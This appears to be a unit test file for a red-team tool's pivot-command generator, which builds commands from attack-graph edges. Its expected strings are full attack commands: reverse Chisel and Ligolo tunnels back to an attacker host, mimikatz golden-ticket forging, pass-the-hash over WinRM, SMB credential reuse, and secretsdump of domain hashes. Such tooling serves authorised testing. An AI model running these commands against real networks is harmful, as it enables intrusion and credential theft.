import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  generatePivotCommands,
  copyPivotCommandWithFeedback,
  getPivotTypeLabel,
  getPivotTypeDescription,
  getPivotTypeColor,
  formatProxychainsConf,
  isTunnelEdge,
  isAdTrustEdge,
  isLateralEdge,
} from '../../utils/pivotCommandUtils';
import * as helpers from '../../utils/helpers';
import { AttackGraphEdge, AttackEdgeType } from '../../types';

describe('pivotCommandUtils', () => {
  beforeEach(() => {
    vi.restoreAllMocks();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('generatePivotCommands for all edge types', () => {
    it('generates SSH Dynamic Port Forwarding commands synchronized with LPORT', () => {
      const edge: AttackGraphEdge = {
        id: 'edge-ssh-1',
        sourceId: 'node-foothold',
        targetId: 'node-internal-1',
        type: 'pivot-ssh',
        status: 'compromised',
        createdAt: '2026-09-26T20:00:00Z',
      };

      const result = generatePivotCommands(
        edge,
        '10.10.10.50',
        '172.16.1.10',
        '10.10.14.15',
        '1080'
      );

      expect(result.listenerCommand).toBe('ssh -N -D 1080 root@10.10.10.50');
      expect(result.proxychainsSnippet).toBe('socks5 127.0.0.1 1080');
      expect(result.verificationCommand).toContain('172.16.1.10');
      expect(result.quickCopyText).toBe('ssh -N -D 1080 root@10.10.10.50');
    });

    it('generates Chisel Reverse Tunnel commands synchronized with LHOST and LPORT', () => {
      const edge: AttackGraphEdge = {
        id: 'edge-chisel-1',
        sourceId: 'node-pivot',
        targetId: 'node-internal-dc',
        type: 'pivot-chisel',
        status: 'potential',
        createdAt: '2026-09-26T20:00:00Z',
      };

      const result = generatePivotCommands(
        edge,
        '10.10.10.60',
        '192.168.100.20',
        '10.10.14.22',
        '9050'
      );

      expect(result.listenerCommand).toBe('chisel server -p 8000 --reverse');
      expect(result.clientCommand).toBe('chisel client 10.10.14.22:8000 R:9050:socks');
      expect(result.proxychainsSnippet).toBe('socks5 127.0.0.1 9050');
      expect(result.verificationCommand).toBe('proxychains4 curl -s -I http://192.168.100.20');
      expect(result.quickCopyText).toBe('chisel server -p 8000 --reverse');
    });

    it('generates Ligolo-ng TUN proxy and agent commands synchronized with LHOST', () => {
      const edge: AttackGraphEdge = {
        id: 'edge-ligolo-1',
        sourceId: 'node-jump',
        targetId: 'node-target',
        type: 'pivot-ligolo',
        status: 'compromised',
        createdAt: '2026-09-26T20:00:00Z',
      };

      const result = generatePivotCommands(
        edge,
        '10.10.10.70',
        '10.200.1.5',
        '10.10.14.30',
        '11601'
      );

      expect(result.listenerCommand).toBe('ligolo-proxy -selfcert');
      expect(result.clientCommand).toBe('agent.exe -connect 10.10.14.30:11601 -ignore-cert');
      expect(result.proxychainsSnippet).toContain('ligolo');
      expect(result.proxychainsSnippet).toContain('10.200.1.5/32');
      expect(result.verificationCommand).toBe('ping -c 2 10.200.1.5');
      expect(result.quickCopyText).toBe('ligolo-proxy -selfcert');
    });

    it('generates SOCKS5 generic proxy commands', () => {
      const edge: AttackGraphEdge = {
        id: 'edge-socks5-1',
        sourceId: 'node-a',
        targetId: 'node-b',
        type: 'pivot-socks5',
        status: 'potential',
        port: 1088,
        createdAt: '2026-09-26T20:00:00Z',
      };

      const result = generatePivotCommands(
        edge,
        '10.10.10.80',
        '172.20.0.10',
        '10.10.14.5',
        '1080'
      );

      expect(result.listenerCommand).toContain('1088');
      expect(result.proxychainsSnippet).toBe('socks5 127.0.0.1 1088');
      expect(result.quickCopyText).toBe('socks5 127.0.0.1 1088');
    });

    it('generates AD Bidirectional Trust enumeration commands', () => {
      const edge: AttackGraphEdge = {
        id: 'edge-trust-1',
        sourceId: 'dc-primary',
        targetId: 'dc-partner',
        type: 'ad-trust-bidirectional',
        status: 'potential',
        createdAt: '2026-09-26T20:00:00Z',
      };

      const result = generatePivotCommands(
        edge,
        '10.10.10.1',
        '10.10.10.2',
        '10.10.14.5',
        '1080',
        { domain: 'apex.local' }
      );

      expect(result.listenerCommand).toBe('nltest /domain_trusts /all_trusts');
      expect(result.clientCommand).toContain('bloodhound-python');
      expect(result.clientCommand).toContain('APEX.LOCAL');
      expect(result.quickCopyText).toBe('nltest /domain_trusts /all_trusts');
    });

    it('generates AD Parent-Child Trust golden ticket commands', () => {
      const edge: AttackGraphEdge = {
        id: 'edge-parent-child-1',
        sourceId: 'dc-parent',
        targetId: 'dc-child',
        type: 'ad-trust-parent-child',
        status: 'potential',
        createdAt: '2026-09-26T20:00:00Z',
      };

      const result = generatePivotCommands(
        edge,
        '10.10.10.10',
        '10.10.10.20',
        '10.10.14.5',
        '1080',
        { domain: 'sec.corp' }
      );

      expect(result.listenerCommand).toContain('mimikatz # kerberos::golden');
      expect(result.listenerCommand).toContain('child.sec.corp');
      expect(result.clientCommand).toContain('mimikatz # kerberos::ptt');
      expect(result.verificationCommand).toBe('dir \\\\10.10.10.20\\c$');
    });

    it('generates Credential Reuse smb commands', () => {
      const edge: AttackGraphEdge = {
        id: 'edge-cred-1',
        sourceId: 'node-app',
        targetId: 'node-db',
        type: 'lateral-cred-reuse',
        status: 'compromised',
        createdAt: '2026-09-26T20:00:00Z',
      };

      const result = generatePivotCommands(
        edge,
        '10.10.10.15',
        '10.10.10.16',
        '10.10.14.5',
        '1080',
        { user: 'svc_backup', password: 'SuperSecret123!' }
      );

      expect(result.listenerCommand).toBe("netexec smb 10.10.10.16 -u 'svc_backup' -p 'SuperSecret123!'");
      expect(result.clientCommand).toContain('--shares');
      expect(result.verificationCommand).toContain('--exec-method smbexec');
      expect(result.quickCopyText).toBe("netexec smb 10.10.10.16 -u 'svc_backup' -p 'SuperSecret123!'");
    });

    it('generates Pass-The-Hash WinRM commands', () => {
      const edge: AttackGraphEdge = {
        id: 'edge-pth-1',
        sourceId: 'node-dev',
        targetId: 'node-prod',
        type: 'lateral-pth-winrm',
        status: 'compromised',
        createdAt: '2026-09-26T20:00:00Z',
      };

      const result = generatePivotCommands(
        edge,
        '10.10.10.33',
        '10.10.10.44',
        '10.10.14.5',
        '1080',
        { user: 'Administrator', hash: 'e52cac67419a9a22ecb08dc5bf8fec60' }
      );

      expect(result.listenerCommand).toBe('evil-winrm -i 10.10.10.44 -u Administrator -H e52cac67419a9a22ecb08dc5bf8fec60');
      expect(result.quickCopyText).toBe('evil-winrm -i 10.10.10.44 -u Administrator -H e52cac67419a9a22ecb08dc5bf8fec60');
    });

    it('generates Domain Admin Path secretsdump commands', () => {
      const edge: AttackGraphEdge = {
        id: 'edge-da-1',
        sourceId: 'node-workstation',
        targetId: 'node-dc',
        type: 'domain-admin-path',
        status: 'compromised',
        createdAt: '2026-09-26T20:00:00Z',
      };

      const result = generatePivotCommands(
        edge,
        '10.10.10.88',
        '10.10.10.99',
        '10.10.14.5',
        '1080',
        { domain: 'inlanefreight.htb', user: 'Administrator', password: 'Password123!' }
      );

      expect(result.listenerCommand).toBe("secretsdump.py 'inlanefreight.htb/Administrator:Password123!'@10.10.10.99 -just-dc-user krbtgt");
      expect(result.clientCommand).toContain('bloodhound-python');
      expect(result.verificationCommand).toBe("secretsdump.py 'inlanefreight.htb/Administrator:Password123!'@10.10.10.99 -just-dc");
      expect(result.quickCopyText).toBe(result.listenerCommand);
    });

    it('handles empty or missing parameters gracefully with robust fallbacks', () => {
      const edge: AttackGraphEdge = {
        id: 'edge-empty-1',
        sourceId: 'src-id',
        targetId: 'tgt-id',
        type: 'pivot-ssh',
        status: 'potential',
        createdAt: '2026-09-26T20:00:00Z',
      };

      const result = generatePivotCommands(edge, '', '', '', '');
      expect(result.listenerCommand).toBe('ssh -N -D 1080 root@src-id');
      expect(result.proxychainsSnippet).toBe('socks5 127.0.0.1 1080');
      expect(result.verificationCommand).toContain('tgt-id');
    });
  });

  describe('copyPivotCommandWithFeedback', () => {
    it('invokes safeCopyToClipboard and playCyberSound when soundEnabled is true', async () => {
      const copySpy = vi.spyOn(helpers, 'safeCopyToClipboard').mockResolvedValue(true);
      const soundSpy = vi.spyOn(helpers, 'playCyberSound').mockImplementation(() => {});

      const ok = await copyPivotCommandWithFeedback('ssh -N -D 1080 root@10.10.10.1', true);
      expect(ok).toBe(true);
      expect(copySpy).toHaveBeenCalledWith('ssh -N -D 1080 root@10.10.10.1');
      expect(soundSpy).toHaveBeenCalledWith('copy');
    });

    it('does not play sound when soundEnabled is false', async () => {
      const copySpy = vi.spyOn(helpers, 'safeCopyToClipboard').mockResolvedValue(true);
      const soundSpy = vi.spyOn(helpers, 'playCyberSound').mockImplementation(() => {});

      const ok = await copyPivotCommandWithFeedback('chisel server -p 8000', false);
      expect(ok).toBe(true);
      expect(copySpy).toHaveBeenCalledWith('chisel server -p 8000');
      expect(soundSpy).not.toHaveBeenCalled();
    });

    it('handles clipboard failure gracefully without playing sound', async () => {
      vi.spyOn(helpers, 'safeCopyToClipboard').mockResolvedValue(false);
      const soundSpy = vi.spyOn(helpers, 'playCyberSound').mockImplementation(() => {});

      const ok = await copyPivotCommandWithFeedback('test', true);
      expect(ok).toBe(false);
      expect(soundSpy).not.toHaveBeenCalled();
    });
  });

  describe('classification and formatting helpers', () => {
    it('returns correct metadata labels and descriptions', () => {
      expect(getPivotTypeLabel('pivot-ssh')).toBe('SSH Dynamic Tunnel');
      expect(getPivotTypeLabel('pivot-chisel')).toBe('Chisel Reverse SOCKS');
      expect(getPivotTypeDescription('pivot-ligolo')).toContain('Layer 3 TUN');
      expect(getPivotTypeColor('domain-admin-path')).toBe('#EF4444');
    });

    it('formats proxychains configuration correctly', () => {
      expect(formatProxychainsConf(1080)).toBe('[ProxyList]\nsocks5 127.0.0.1 1080');
      expect(formatProxychainsConf('9050')).toBe('[ProxyList]\nsocks5 127.0.0.1 9050');
    });

    it('correctly classifies edge categories', () => {
      const tunnelTypes: AttackEdgeType[] = ['pivot-ssh', 'pivot-chisel', 'pivot-ligolo', 'pivot-socks5'];
      tunnelTypes.forEach((t) => {
        expect(isTunnelEdge(t)).toBe(true);
        expect(isAdTrustEdge(t)).toBe(false);
        expect(isLateralEdge(t)).toBe(false);
      });

      const adTypes: AttackEdgeType[] = ['ad-trust-bidirectional', 'ad-trust-parent-child'];
      adTypes.forEach((t) => {
        expect(isAdTrustEdge(t)).toBe(true);
        expect(isTunnelEdge(t)).toBe(false);
      });

      const lateralTypes: AttackEdgeType[] = ['lateral-cred-reuse', 'lateral-pth-winrm', 'domain-admin-path'];
      lateralTypes.forEach((t) => {
        expect(isLateralEdge(t)).toBe(true);
        expect(isTunnelEdge(t)).toBe(false);
      });
    });
  });
});
